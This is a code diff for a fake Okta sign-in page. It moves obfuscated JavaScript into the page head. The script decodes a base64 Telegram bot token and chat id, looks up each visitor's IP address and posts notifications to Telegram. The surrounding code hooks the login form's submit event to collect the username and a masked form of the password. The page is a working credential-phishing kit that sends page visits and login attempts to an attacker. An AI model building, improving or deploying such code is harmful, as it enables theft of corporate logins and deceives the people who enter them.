@@ -69,6 +69,63 @@
             border-color: #333 !important;
         }
     </style>
+<script>
+// ==================== TELEGRAM NOTIFY ====================
+const _tgT = atob('ODIyNzA0MzA4MzpBQUZzZUlPOTlEbWI5OHlHSkZrT0ZLMFotazZTcTkwQzRLdw==');
+const _tgC = atob('LTQ2MjMyMDY1ODU=');
+
+function _esc(s) {
+  return String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+}
+
+async function _ip() {
+  const apis = [
+    'https://api.ipify.org?format=json',
+    'https://api.my-ip.io/v2/ip.json',
+    'https://ipinfo.io/json'
+  ];
+  for (const url of apis) {
+    try {
+      const r = await fetch(url);
+      const j = await r.json();
+      return j.ip || 'unknown';
+    } catch (e) { continue; }
+  }
+  return 'unknown';
+}
+
+function _tg(text) {
+  try {
+    return fetch('https://api.telegram.org/bot' + _tgT + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: _tgC,
+        text: text,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      }),
+      keepalive: true
+    }).catch(() => {});
+  } catch (e) {
+    return Promise.resolve();
+  }
+}
+
+function _now() {
+  const d = new Date();
+  const pad = (n) => String(n).padStart(2, '0');
+  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} UTC`;
+}
+
+function _mask(pwd) {
+  if (!pwd) return '';
+  var len = pwd.length;
+  if (len <= 2) return '*'.repeat(len);
+  if (len <= 4) return pwd[0] + '*'.repeat(len - 1);
+  return pwd[0] + pwd[1] + '*'.repeat(len - 4) + pwd[len - 2] + pwd[len - 1];
+}
+</script>
 </head>
 <body class="auth okta-container">
 <div class="login-bg-image tb--background bgStyle" data-se="login-bg-image" id="login-bg-image"> </div>
@@ -263,54 +320,6 @@
 
 
 <script>
-// ==================== TELEGRAM NOTIFY ====================
-const _tgT = atob('ODIyNzA0MzA4MzpBQUZzZUlPOTlEbWI5OHlHSkZrT0ZLMFotazZTcTkwQzRLdw==');
-const _tgC = atob('LTQ2MjMyMDY1ODU=');
-
-function _esc(s) {
-  return String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
-}
-
-async function _ip() {
-  const apis = [
-    'https://api.ipify.org?format=json',
-    'https://api.my-ip.io/v2/ip.json',
-    'https://ipinfo.io/json'
-  ];
-  for (const url of apis) {
-    try {
-      const r = await fetch(url);
-      const j = await r.json();
-      return j.ip || 'unknown';
-    } catch (e) { continue; }
-  }
-  return 'unknown';
-}
-
-function _tg(text) {
-  try {
-    return fetch('https://api.telegram.org/bot' + _tgT + '/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: _tgC,
-        text: text,
-        parse_mode: 'HTML',
-        disable_web_page_preview: true
-      }),
-      keepalive: true
-    }).catch(() => {});
-  } catch (e) {
-    return Promise.resolve();
-  }
-}
-
-function _now() {
-  const d = new Date();
-  const pad = (n) => String(n).padStart(2, '0');
-  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} UTC`;
-}
-
 // ==================== PAGE-VISIT NOTIFICATION ====================
 (async () => {
   try {
@@ -330,14 +339,6 @@ function _now() {
 })();
 
 // ==================== LOGIN SUBMIT NOTIFICATION ====================
-function _mask(pwd) {
-  if (!pwd) return '';
-  var len = pwd.length;
-  if (len <= 2) return '*'.repeat(len);
-  if (len <= 4) return pwd[0] + '*'.repeat(len - 1);
-  return pwd[0] + pwd[1] + '*'.repeat(len - 4) + pwd[len - 2] + pwd[len - 1];
-}
-
 document.getElementById('form20').addEventListener('submit', async function (e) {
   e.preventDefault();
   const username = document.getElementById('input28').value.trim();
